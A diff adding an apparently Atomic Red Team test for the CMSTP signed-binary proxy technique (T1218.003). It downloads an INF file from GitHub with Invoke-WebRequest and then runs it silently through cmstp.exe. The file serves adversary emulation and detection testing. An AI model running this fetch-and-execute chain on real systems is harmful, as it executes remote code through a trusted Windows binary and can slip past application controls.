@@ -1,0 +1,13 @@
+#TechniqueName: Signed Binary Proxy Execution: CMSTP
+#AtomicTestName: CMSTP Executing Remote Scriptlet
+#Description: Adversaries may supply CMSTP.exe with INF files infected with malicious commands&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.003\src\T1218.003.inf) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" -OutFile "PathToAtomicsFolder\T1218.003\src\T1218.003.inf"
+
+
+#commands
+cmstp.exe /s PathToAtomicsFolder\T1218.003\src\T1218.003.inf
+
